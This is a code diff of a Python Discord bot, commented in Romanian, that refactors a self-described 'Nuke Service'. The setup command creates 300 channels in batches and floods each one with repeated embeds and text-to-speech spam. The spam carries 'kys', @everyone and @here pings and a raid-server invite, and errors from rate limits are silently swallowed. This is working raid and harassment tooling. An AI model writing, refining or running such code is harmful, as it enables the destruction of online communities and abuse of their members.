@@ -297,7 +297,36 @@ async def setup(ctx):
         "Larp-empire-on-top"
     ]
 
-    # ===== EMBED UNIC =====
+    # ===== CREARE 300 CANALE GOALE =====
+    total_channels = 300
+    created_channels = []
+    font_styles = ["bold", "script", "double"]
+
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale goale...")
+
+    async def create_channel(index):
+        try:
+            base_name = random.choice(base_channel_names)
+            font_style = random.choice(font_styles)
+            styled_name = apply_font(base_name, font_style)
+            if len(styled_name) > 100:
+                styled_name = base_name
+            ch = await guild.create_text_channel(name=styled_name)
+            return ch
+        except Exception as e:
+            await user.send(f"❌ Eroare la canalul {index}: {e}")
+            return None
+
+    # Creează toate canalele în loturi de câte 20
+    for i in range(0, total_channels, 20):
+        batch_tasks = [create_channel(i+j) for j in range(20) if i+j < total_channels]
+        results = await asyncio.gather(*batch_tasks)
+        created_channels.extend([ch for ch in results if ch is not None])
+        await asyncio.sleep(1)  # Pauză între loturi
+
+    await user.send(f"✅ Canale create: {len(created_channels)}. Încep trimiterea mesajelor...")
+
+    # ===== MESAJE DE TRIMIS ÎN FIECARE CANAL =====
     embed_content = discord.Embed(
         title="**LARP EMPIRE N4KED YOUR AHH**",
         description=(
@@ -312,55 +341,31 @@ async def setup(ctx):
     embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
     embed_content.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== TEXT SPAM (50 de ori) =====
     spam_text = "corrupt own this mfs kys you js got n4ked https://discord.gg/larpempire @everyone @here"
-
-    # ===== INVITAȚIE SEPARATĂ =====
     invite_text = "https://discord.gg/larpempire @everyone join"
 
-    # ===== CREARE 300 CANALE =====
-    created = 0
-    font_styles = ["bold", "script", "double"]
-
-    async def create_single_channel(index):
-        nonlocal created
+    async def send_messages(channel):
         try:
-            base_name = random.choice(base_channel_names)
-            font_style = random.choice(font_styles)
-            styled_name = apply_font(base_name, font_style)
-            if len(styled_name) > 100:
-                styled_name = base_name
-
-            ch = await guild.create_text_channel(name=styled_name)
-
-            # 1. Spam embed de 15 ori
+            # 15 embed-uri
             for _ in range(15):
-                await ch.send(embed=embed_content)
-
-            # 2. Spam text de 50 de ori
+                await channel.send(embed=embed_content)
+            # 50 de mesaje text
             for _ in range(50):
-                await ch.send(content=spam_text, tts=True)
+                await channel.send(content=spam_text, tts=True)
+            # încă un embed
+            await channel.send(embed=embed_content)
+            # invitație
+            await channel.send(content=invite_text)
+        except Exception:
+            pass  # Ignorăm erorile de rată-limit sau permisiuni
 
-            # 3. Trimite embed-ul încă o dată
-            await ch.send(embed=embed_content)
+    # Trimite mesaje în toate canalele în paralel, în loturi de câte 10
+    for i in range(0, len(created_channels), 10):
+        batch = created_channels[i:i+10]
+        await asyncio.gather(*[send_messages(ch) for ch in batch])
+        await asyncio.sleep(0.5)  # Pauză scurtă
 
-            # 4. Trimite invitația separat
-            await ch.send(content=invite_text)
-
-            created += 1
-        except Exception as e:
-            await user.send(f"❌ Eroare la canalul {index}: {e}")
-
-    await user.send("🔄 Încep crearea a 300 de canale cu fonturi diferite...")
-
-    tasks = [create_single_channel(i) for i in range(300)]
-    batch_size = 10
-    for i in range(0, len(tasks), batch_size):
-        batch = tasks[i:i+batch_size]
-        await asyncio.gather(*batch)
-        await asyncio.sleep(1)  # 10 canale pe secundă
-
-    await user.send(f"✅ Creare finalizată! {created} canale create.")
+    await user.send(f"✅ Mesaje trimise în toate canalele.")
 
     try:
         await guild.create_role(name="1weeksober-on-top")
